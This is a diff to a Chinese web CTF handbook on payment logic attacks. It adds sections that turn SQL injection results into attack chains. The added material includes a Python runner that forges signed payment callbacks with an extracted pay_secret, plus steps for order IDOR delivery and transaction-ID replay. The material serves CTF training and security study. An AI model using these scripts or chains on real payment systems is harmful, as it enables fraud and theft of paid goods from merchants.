@@ -3,18 +3,18 @@ id: "ctf-website/12-payment/payment-logic"
 title: "Payment Logic Attacks — 支付类 Web CTF 技术手册"
 title_en: "Payment Logic Attacks — Web CTF Payment Technique Handbook"
 summary: >
-  支付类 CTF 题目的入门到进阶技术手册，涵盖路由与参数发现、金额篡改、状态机绕过、回调签名伪造、
-  幂等并发、订单 IDOR、优惠券组合及 SSRF 等完整攻击链。
+  支付类 CTF 题目的进阶技术手册，涵盖路由与参数发现、金额篡改、状态机绕过、回调签名伪造、
+  幂等并发、订单 IDOR、优惠券组合、SSRF，以及 SQLi/NoSQLi 驱动的订单账本错位攻击链。
 summary_en: >
   A beginner-to-advanced handbook for payment-related CTF challenges, covering route discovery,
   parameter tampering, state machine bypass, callback forgery, idempotency races, order IDOR,
   coupon chaining, and SSRF — with complete attack chains.
 board: "ctf-website"
 category: "12-payment"
-signals: ["Payment Logic", "支付逻辑", "路由发现", "金额篡改", "状态机", "回调签名", "幂等", "并发", "订单IDOR"]
+signals: ["Payment Logic", "支付逻辑", "路由发现", "金额篡改", "状态机", "回调签名", "幂等", "并发", "订单IDOR", "支付SQLi", "订单账本"]
 mcp_tools: ["http_probe", "kb_router"]
-keywords: ["支付逻辑漏洞", "payment logic", "CTF支付题", "订单状态机", "支付回调", "并发攻击", "web CTF"]
-difficulty: "beginner"
+keywords: ["支付逻辑漏洞", "payment logic", "CTF支付题", "订单状态机", "支付回调", "并发攻击", "web CTF", "支付SQLi", "账本错位"]
+difficulty: "advanced"
 tags: ["payment", "ctf", "web-security", "logic-flaw", "state-machine", "idor"]
 language: "zh-CN"
 last_updated: "2026-07-04"
@@ -66,6 +66,73 @@ related_articles: ["ctf-website/12-payment/payment-bypass", "ctf-website/12-paym
   "after": {"order_status": "paid", "payment_amount": 0.01, "credits": 1000},
   "mismatch": ["order.amount != payment.amount", "credits increased before provider verified"]
 }
+```
+
+### 0.2 SQLi/NoSQLi 驱动的支付账本复原
+
+如果前面已经从 `../03-injection/sqli-nosqli.md` 抽到表名、列名或部分订单字段，不要把它当成单独成果。支付题要把 DB 证据落回六张表：订单、流水、权益、余额、优惠、配置。
+
+| 抽到的内容 | 立即转化成什么动作 | 命中信号 |
+|---|---|---|
+| `orders.id/out_trade_no` | 双账号 IDOR、回调绑定、发货接口 | 非所有者订单可读/可发货 |
+| `orders.amount/payments.paid_amount` | 改金额、低价 intent、金额核对差异 | paid 金额与订单金额不一致 |
+| `payments.transaction_id/notify_id` | 幂等重放、跨订单复用、空白/大小写变体 | 同一订单多次权益 |
+| `settings.pay_secret/webhook_secret` | 生成签名回调、测试签名覆盖字段 | notify 从 fail 变 success |
+| `entitlements.download_key/license_key` | 直接领数字商品、枚举邻近资源 | 下载链接/卡密/flag |
+| `coupon_logs/wallet_logs` | 优惠叠加、余额负数、退款残留 | 余额或折扣非预期增加 |
+
+```python
+# sql_to_payment_router.py — 把 SQLi 结果转成支付下一跳
+import json
+import re
+
+ROUTES = [
+    (re.compile(r"out_trade_no|order_id|orders?\.", re.I), "order_idor_or_callback_bind"),
+    (re.compile(r"transaction_id|notify_id|payments?\.", re.I), "notify_replay_or_idempotency"),
+    (re.compile(r"pay_secret|webhook_secret|sign_key|app_key", re.I), "signed_callback_forge"),
+    (re.compile(r"license|download|cdkey|entitlement", re.I), "digital_goods_delivery"),
+    (re.compile(r"coupon|wallet|balance|refund", re.I), "coupon_wallet_refund_chain"),
+]
+
+def route_sqli_finding(finding):
+    text = json.dumps(finding, ensure_ascii=False)
+    hits = [name for rx, name in ROUTES if rx.search(text)]
+    return hits or ["schema_more_columns"]
+
+sample = {
+    "table": "payments",
+    "columns": ["order_id", "transaction_id", "paid_amount", "status"],
+    "row": {"order_id": "1001", "transaction_id": "TX20260704001"}
+}
+print(route_sqli_finding(sample))
+```
+
+### 0.3 账本字段的“谁说了算”
+
+支付链的核心问题是哪个字段被信任。SQLi/备份泄露/API 回显能帮你直接定位“谁说了算”：
+
+| 业务问题 | 看哪张表/字段 | 常见错位 |
+|---|---|---|
+| 发货看什么状态 | `orders.status` / `payments.status` / `delivery.status` | 回调只改流水，发货只读订单 |
+| 金额以谁为准 | `orders.amount` / `payments.paid_amount` / `gateway_amount` | 支付 0.01，订单仍按 100 发货 |
+| 幂等靠哪个键 | `transaction_id` / `notify_id` / `order_id` | 新 notify_id 旧 transaction_id 重放 |
+| 权益何时生成 | `entitlements.created_at` / `delivery_logs` | pending 时已生成卡密 |
+| 退款是否回收权益 | `refund_logs.status` / `entitlements.revoked_at` | refund success 后 VIP 仍有效 |
+
+```python
+# ledger_authority_diff.py — 判断状态由哪本账驱动
+def classify_authority(before, after):
+    changes = []
+    for book in ["order", "payment", "delivery", "entitlement", "wallet"]:
+        if before.get(book) != after.get(book):
+            changes.append(book)
+    if "payment" in changes and "order" not in changes:
+        return "payment_only_changed"
+    if "order" in changes and "entitlement" in changes:
+        return "order_drives_delivery"
+    if "wallet" in changes and "payment" not in changes:
+        return "wallet_side_effect_without_payment"
+    return "+".join(changes) or "no_state_change"
 ```
 
 ### 首轮黑盒记录模板
@@ -512,7 +579,93 @@ python .\scripts\ctf-website\fingerprint_cve_pipeline.py `
   --out .\reports\ctf-website\<case>\fingerprint-cve
 ```
 
-## 10. 证据与复现交付标准
+## 10. SQLi → 支付链执行模板
+
+当 SQLi 已经抽到订单号、支付密钥、流水号或权益字段时，按下面顺序推进。每一步只看服务端状态差异，前端“支付成功”文案不算命中。
+
+### 10.1 三条主链
+
+| 链路 | 前置证据 | 动作 | 命中标志 |
+|---|---|---|---|
+| 订单绑定链 | `orders.id/out_trade_no/user_id` | B session 读/发货 A order；notify 带 A order | 非所有者权益变化 |
+| 签名回调链 | `pay_secret/webhook_secret/app_key` | 生成 provider 风格签名，改 `amount/status/order_id` | pending → paid/delivered |
+| 幂等重放链 | `transaction_id/notify_id/provider` | 同交易号变体、跨 provider、并发重放 | 多次发货/余额增加 |
+
+```python
+# sqli_payment_chain_runner.py — 已有 SQLi 产物后的支付链执行骨架
+import copy
+import hashlib
+import hmac
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def hmac_sha256_sign(params, secret):
+    raw = "&".join(f"{k}={params[k]}" for k in sorted(params) if k != "sign")
+    return hmac.new(secret.encode(), raw.encode(), hashlib.sha256).hexdigest()
+
+def snapshot(order_id):
+    paths = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/deliver",
+        "me": "/api/me",
+    }
+    out = {}
+    for name, path in paths.items():
+        method = "POST" if name == "delivery" else "GET"
+        r = S.request(method, BASE + path, timeout=10, allow_redirects=False)
+        out[name] = {"status": r.status_code, "len": len(r.text), "body": r.text[:500]}
+    return out
+
+def forged_notify(order_id, secret, amount="0.01"):
+    body = {
+        "out_trade_no": order_id,
+        "trade_status": "TRADE_SUCCESS",
+        "total_amount": amount,
+        "transaction_id": "SQLI_TX_REPLAY_001",
+    }
+    body["sign"] = hmac_sha256_sign(body, secret)
+    return S.post(BASE + "/notify", data=body, timeout=10, allow_redirects=False)
+
+def run(order_id, secret):
+    before = snapshot(order_id)
+    resp = forged_notify(order_id, secret)
+    after = snapshot(order_id)
+    print(json.dumps({
+        "before": before,
+        "notify": {"status": resp.status_code, "body": resp.text[:500]},
+        "after": after,
+    }, ensure_ascii=False, indent=2))
+```
+
+### 10.2 SQLi 抽字段后的行动矩阵
+
+| SQLi 结果 | 不要停在 | 继续做 |
+|---|---|---|
+| 表名 `orders` | 截图表名 | 抽当前用户和相邻用户 `order_id/status/amount`，做双账号差分 |
+| 列名 `pay_secret` | 只记录密钥名 | 抽密钥值，跑签名覆盖字段矩阵 |
+| `transaction_id` | 只证明可读流水 | 改大小写、尾空格、provider，测重放和跨订单 |
+| `download_key` | 只读 key | 访问下载接口、换 order_id、测退信/邮件链接 |
+| `coupon_code` | 只列优惠券 | 并发兑换、跨商品使用、负金额组合 |
+
+### 10.3 成功/失败样本
+
+成功样本：
+
+- SQLi 抽到 `pay_secret` 后，伪造回调让同一订单从 `pending` 变 `paid`，随后 `entitlements` 新增记录。
+- 抽到 A 的 `order_id` 后，用 B session 调 `/deliver` 返回卡密或下载链接。
+- 抽到 `transaction_id` 后，同交易号加尾空白被当成新流水，余额/权益增加两次。
+
+失败样本：
+
+- 密钥抽出但签名串包含隐藏字段，所有回调仍返回 `invalid sign`。
+- 订单号可读但所有发货接口重新校验当前用户。
+- 流水号可重放但唯一约束按规范化后的交易号生效。
+
+## 11. 证据与复现交付标准
 
 一个支付漏洞只有满足以下任一项才算确认：
 
@@ -532,7 +685,7 @@ python .\scripts\ctf-website\fingerprint_cve_pipeline.py `
 4. `verify`：漏洞前后状态 diff。
 5. `flag extraction`：自动 regex `flag{}`, `CTF{}`, `DASCTF{}`。
 
-### 10.1 账本差异采集器
+### 11.1 账本差异采集器
 
 ```python
 import json
